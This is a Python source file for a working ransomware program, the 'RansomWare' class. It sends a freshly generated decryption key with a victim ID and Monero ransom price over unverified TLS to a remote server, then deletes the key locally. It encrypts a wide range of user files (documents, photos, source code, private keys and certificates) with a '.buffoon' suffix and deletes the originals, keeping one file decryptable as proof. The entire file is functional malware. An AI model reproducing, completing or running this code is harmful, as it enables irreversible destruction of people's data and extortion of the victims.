import os, sys
from os.path import dirname,realpath,getsize
from sys import path
from cryptography.fernet import Fernet
from time import sleep
from threading import Thread,active_count,Event
import socket
from ssl import _create_unverified_context
from time import time
# Local import Constant
current = dirname(realpath(__file__))
current_dir = dirname(current)
path.append(current_dir)
# Import 
from const import *

class RansomWare : 

    def __init__(self) : 

        self.key = Fernet.generate_key() # 32 bits
        self.cypher = Fernet(self.key) # Cypher
        self.proc_core = os.cpu_count() # All CPU Core
        self.free_key = Fernet.generate_key() # For decrypt 1 file free
        self.free_cypher = Fernet(self.free_key)
        self.files_target = ['txt','jpg','jpeg','png','docx','doc','html','ico','mp3','mp4','odt','odp','ods','odg','pdf','ppt','pps','pptx','py','zip',
                            'tar','md','xls','xlsx','wav','xml','log','webp','gif','py','cpp','torrent','bak','tar.gz',
                            'sh','rtf','msi','key','pem','crt','bash','css',]
        

        #Call functions
        self.load_id_key()
        self.send_key()
        self.write_free_key()
        start_time = time()
        self.enumerate_files_to_encrypt()
        self.encrypt_free_file()
        self.write_free_file_decrypt()
        self.thread_army()
        self.thread_army_big()
        end_time = time()
        print('temps:',end_time-start_time)


    def load_id_key(self): 
        with open(ID_KEY_PATH,'rb') as f : 
            self.identification_key = f.read()


    def send_key(self) : 
        'Send decryption to the server through TLS'
        try :
            monero_price = open(PRICE_MONERO_PATH,'r').read()
            data = f'Identification key : {self.identification_key.decode()} | Decryption Key : {self.key.decode()} | Monero : {monero_price}'.encode()
            print(data)
            context =  _create_unverified_context()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssock = context.wrap_socket(s)
            s.close()
            ssock.settimeout(3.0)
            ssock.connect((HOST,PORT))
            ssock.sendall(data)
            print('key sent')
            del self.key #Delete from memory

        except Exception as e : 
            print(e)
            print(self.key)


    def write_free_key(self): 
        with open(FREE_KEY_PATH,'a') as f : 
            f.write(str(self.free_key.decode('utf8')))


    def enumerate_files_to_encrypt(self): 
        'Enumerates all files to encrypt'
        self.free_to_decrypt = []
        self.files_to_encrypt = []
        self.big_files_to_encrypt = []
        
        for root,sub,files in os.walk(DIR_TO_HIT) : 
            for f in files :
                abs_file_path = os.path.join(root,f)
                # If the file extension are not in target_files
                if not abs_file_path.split('.')[-1] in self.files_target :
                    continue 
                # Enumerate big files
                if (getsize(abs_file_path)/10**6) > 80 : # If larger than 80MB
                    self.big_files_to_encrypt.append(abs_file_path)
                    continue

                self.files_to_encrypt.append(abs_file_path)

        # First file enumerate become the free file
        if self.files_to_encrypt:
            free_file = self.files_to_encrypt[0]
            self.files_to_encrypt.remove(free_file)
        else:
            free_file = self.big_files_to_encrypt[0]
            self.big_files_to_encrypt.remove(free_file)

        self.free_to_decrypt.append(free_file)


    def encrypt_free_file(self) : 
        'Encrypt the file to decrypt freely'
        try:
            with open(self.free_to_decrypt[0], "rb") as fin, \
            open(f'{self.free_to_decrypt[0]}.buffoon', "wb") as fout:
                while True:
                    block = fin.read(6000000)  
                    if not block:
                        break
                    output = self.free_cypher.encrypt(block)
                    print(f'[-] Free file [-] encrypted block size {self.free_to_decrypt[0]}: ' + str(len(output)))  
                    fout.write(output)
            
            os.remove(self.free_to_decrypt[0])
        except:pass
        

    def write_free_file_decrypt(self) : 
        'Write the path of the free file to decrypt'
        with open(PATH_FREE_FILE_DECRYPT,'a') as f : 
            f.write(self.free_to_decrypt[0])

    def thread_army(self) : 
        'Threading encryption'
        event = Event()
        event.is_set()

        try :
            for files_to_encrypt in self.files_to_encrypt : 
                
                # If the file extension are not in target_files
                if not files_to_encrypt.split('.')[-1] in self.files_target : continue 
                # Threading
                th1 = Thread(target=self.encrypt_files,args=(files_to_encrypt,),daemon=True) 
                th1.start()
                # Limit thread 
                if active_count() == os.cpu_count() : 
                    #Take down the thread
                    th1.join()

            while event:
                th1.join()
                if active_count() == 1 :
                    event.clear()
                    break
            sleep(1)
            
        except:pass


    def encrypt_files(self,files_to_encrypt) : 
        'Encrypt files'

        try:
            # Read file
            with open(f'{files_to_encrypt}', 'rb') as f : data = f.read()
            #Encrypt
            data_encrypted = self.cypher.encrypt(data)
            print(f'Encrypt {files_to_encrypt}')
            with open(f'{files_to_encrypt}','wb') as ff : ff.write(data_encrypted)
            os.rename(files_to_encrypt, files_to_encrypt+'.buffoon') # Rename file with '.buffoon'
        except Exception as e: 
            print(e)


    def thread_army_big(self) : 
        'Threading encryption for big files'
        event = Event()
        event.is_set()
        try :
            for file_to_encrypt in self.big_files_to_encrypt : 
                # Threading
                th2 = Thread(target=self.encrypt_big_files,args=(file_to_encrypt,),daemon=True) 
                th2.start()
                print('START THE BIG THREAD')
                # We limit the numbers of threads by the amount of CPU cores
                if active_count() == os.cpu_count() : 
                    #Take down the thread
                    th2.join()
                    print('BIG Threading reseted !!!')
            # Clean up threading
            while event:
                th2.join()
                if active_count() == 1 :
                    event.clear()
                    break
            sleep(1)
            del self.cypher #Delete from memory
            print('cypher deleted')
        except Exception as e :
            print(e)


    def encrypt_big_files(self,files_to_encrypt):
        'Encrypt big files by chunk of 6MB'
        try:
            with open(files_to_encrypt, "rb") as fin, open(f'{files_to_encrypt}.buffoon', "wb") as fout:
                while True:
                    block = fin.read(6000000)  
                    if not block:
                        break
                    output = self.cypher.encrypt(block)
                    print(f'encrypted block size {files_to_encrypt}: ' + str(len(output)))  
                    fout.write(output)
            
            os.remove(files_to_encrypt)
        except Exception as e:
            print(e)
            pass
